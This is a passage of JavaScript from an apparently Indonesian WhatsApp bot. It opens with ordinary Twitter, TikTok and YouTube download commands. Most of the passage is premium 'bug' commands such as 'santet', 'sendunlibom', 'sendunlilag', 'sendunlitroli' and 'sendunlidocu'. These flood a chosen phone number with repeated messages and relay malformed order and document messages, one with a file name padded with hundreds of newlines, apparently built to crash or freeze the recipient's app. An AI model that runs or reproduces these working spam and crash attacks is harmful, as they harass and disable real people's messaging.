if (!text) return reply(`📝Dimana urlnya?\n\n*📌Contoh :* ${prefix + command} https://twitter.com/fernandavasro/status/1569741835555291139?t=ADxk8P3Z3prq8USIZUqXCg&s=19`)
const { twitterdl } = require('@bochilteam/scraper-sosmed')
let dl = await twitterdl(args[0])
hinata.sendFile(from, dl.url, "", m, { caption: mess.success })
}break
//=================================================//
case 'tiktokvideo':{
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!text) return reply(`📝Link nya mana???\n\n📌Contoh : ${prefix+command} https://vm.tiktok.com/ZSRApJY1K/`)
require('./HinataBase/lib/tiktok').Tiktok(q).then( data => {
hinata.sendMessage(m.chat, { caption: mess.success, video: { url: data.nowm }}, {quoted:m})
})
}break
//=================================================//
case 'tiktokaudio':{
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!text) return reply(`📝Link Nya mana???\n📌Contoh ${prefix+command} https://vm.tiktok.com/ZSRApJY1K/`)
require('./HinataBase/lib/tiktok').Tiktok(q).then( data => {
hinata.sendMessage(m.chat, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted: m })
})
}break
//=================================================//
case 'play': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!text) return reply(`📌Contoh : ${prefix + command} Sido Rondo`)
let yts = require("yt-search")
let search = await yts(text)
let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
const YT = require('./HinataBase/lib/ytdl')
const pl= await YT.mp3(anu.url)
await hinata.sendMessage(m.chat,{
audio: fs.readFileSync(pl.path),
fileName: anu.title + '.mp3',
mimetype: 'audio/mp4', ptt: true,
contextInfo:{
externalAdReply:{
title:anu.title,
body: botname,
thumbnail: await fetchBuffer(pl.meta.image),
mediaType:2,
mediaUrl:anu.url,
}
},
},{quoted:m})
await fs.unlinkSync(pl.path)
}break
//=================================================//
case 'ytmp3': case 'ytaudio': {//credit: Ray Senpai â¤ï¸ https://github.com/EternityBots/Nezuko
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!args || !args[0]) return reply(`📌Contoh : ${prefix + command} https://youtube.com/shorts/YI7EurQd0n0?feature=share`)
if (!args[0].match(/youtu/gi)) return reply(`❎ Periksa tautan YouTube`)
downloadMp3(text)
}break
//=================================================//
case 'ytmp4': case 'ytvideo': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!args || !args[0]) return reply(`📌Contoh : ${prefix + command} https://youtube.com/shorts/YI7EurQd0n0?feature=share`)
if (!args[0].match(/youtu/gi)) return reply(`❎ Periksa tautan YouTube`)
let { youtubedl, youtubedlv2 } = require('@bochilteam/scraper')
let limit = 50
let q = args[1] || '360p'
let v = args[0]
const yt = await youtubedl(v).catch(async () => await youtubedlv2(v))
const dl_url = await yt.video[q].download()
const title = await yt.title
const size = await yt.video[q].fileSizeH
if (size.split('MB')[0] >= limit) return m.reply(` ✦「 𝗬𝗢𝗨𝗧𝗨𝗕𝗘 𝗩𝗜𝗗𝗘𝗢 」✦\n\n⚖️𝗨𝗸𝘂𝗿𝗮𝗻 : ${size}\n🎞️𝗞𝘂𝗮𝗹𝗶𝘁𝗮𝘀 : ${q}\n\nFile melebihi batas ukuran⚠️\nBatas ukuran saat ini adalah *${limit} MB*`)
hinata.sendMessage(m.chat, { caption: `✦「 𝗬𝗢𝗨𝗧𝗨𝗕𝗘 𝗩𝗜𝗗𝗘𝗢 」✦

📝𝗝𝘂𝗱𝘂𝗹 : ${title}
🎞️𝗞𝘂𝗮𝗹𝗶𝘁𝗮𝘀 : ${q}
⚖️𝗨𝗸𝘂𝗿𝗮𝗻 : ${size}

01:43 ━━━━●───── 60:45
⇆ㅤ ㅤ◁ㅤ ❚❚ ㅤ▷ ㅤㅤ↻﻿
ılıılıılıılıılıılı
ᴠᴏʟᴜᴍᴇ : ▮▮▮▮▮▮
`, video: { url: dl_url }}, {quoted:m})
}break
//=================================================//
case 'santet' : {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isPrem) return hinatareplyprem()
if (!text) return reply(`📝Fitur ini di gunakan untuk spam cht ke pengguna WhatsApp\n\n*📌Contoh :* ${prefix + command} 6281xxx\n\n🗒️Notes: Masukan no target tanpa awalan tanda (+)`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
hinata.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
}
reply(`Berhasil mengirim Bug Ke ${Pe} Tolong Jeda 3 Menit Yah`)
break
//=================================================//
case 'sendgasfull' : {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isPrem) return hinatareplyprem()
if (!text) return reply(`📝Fitur ini di gunakan untuk spam cht ke pengguna WhatsApp\n\n*📌Contoh :* ${prefix + command} 6281xxx\n\n🗒️Notes: Masukan no target tanpa awalan tanda (+)`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
}
reply(`Berhasil mengirim Bug Ke ${Pe} Tolong Jeda 3 Menit Yah`)
break
//=================================================//
case 'sendunlitroli': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isPrem) return hinatareplyprem()
if (!args[0]) return reply(`📝Fitur ini di gunakan untuk spam cht ke pengguna WhatsApp\n\n*📌Contoh :* ${prefix + command} 6281xxx\n\n🗒️Notes: Masukan no target tanpa awalan tanda (+)`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
jumlah = "15"
for (let i = 0; i < jumlah; i++) {
let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${botname}`,jpegThumbnail: thumb}}}
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": virgam,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${botname}`,
"orderTitle": " BUG TROLI ", // 
"sellerJid": `${global.ownernumber}@s.whatsapp.net`,
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: from, quoted:m})
hinata.relayMessage(bnnd, order.message, { messageId: order.key.id })
}
reply(`*Sukses mengirim Bug Ke ${bnnd} Tolong Jeda 3 Menit Yah*`)
}break
//=================================================//
case 'sendunlidocu': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isPrem) return hinatareplyprem()
if (args.length < 1) return reply(`📝Fitur ini di gunakan untuk spam cht ke pengguna WhatsApp\n\n*📌Contoh :* ${prefix + command} 6281xxx\n\n🗒️Notes: Masukan no target tanpa awalan tanda (+)`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
jumlah = "15"
for (let i = 0; i < jumlah; i++) {
var document = generateWAMessageFromContent(from, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "",
"title": "𝗕𝗔𝗦𝗘 𝗦𝗜𝗗",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `${botname}⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
"caption":` ${botname} ${buttonkal}`,
}

}), { userJid: from, quoted:kalgans})
hinata.relayMessage(bnnd, document.message, { messageId: document.key.id })
}
reply(`Sukses mengirim Bug Ke ${bnnd} Tolong Jeda 3 Menit Yah`)
}break
//=================================================//
case 'sendunlicuy' : {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isPrem) return hinatareplyprem()
if (!text) return reply(`📝Fitur ini di gunakan untuk spam cht ke pengguna WhatsApp\n\n*📌Contoh :* ${prefix + command} 6281xxx\n\n🗒️Notes: Masukan no target tanpa awalan tanda (+)`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
}
reply(`*Sukses mengirim Bug Ke ${Pe} Tolong Jeda 3 Menit Yah*`)
break
//=================================================//
case 'sendunlibom' : {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isPrem) return hinatareplyprem()
if (!text) return reply(`📝Fitur ini di gunakan untuk spam cht ke pengguna WhatsApp\n\n*📌Contoh :* ${prefix + command} 6281xxx\n\n🗒️Notes: Masukan no target tanpa awalan tanda (+)`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: weg}, {quoted:kalgans})
await sleep(2000)
}
reply(`*Sukses mengirim Bug Ke ${Pe} Tolong Jeda 3 Menit Yah*`)
break
//=================================================//
case 'sendunlilag': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isPrem) return hinatareplyprem()
if (!text) return reply(`📝Fitur ini di gunakan untuk spam cht ke pengguna WhatsApp\n\n*📌Contoh :* ${prefix + command} 6281xxx\n\n🗒️Notes: Masukan no target tanpa awalan tanda (+)`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: cttl}, {quoted:kalgans})
await sleep(2000)
}
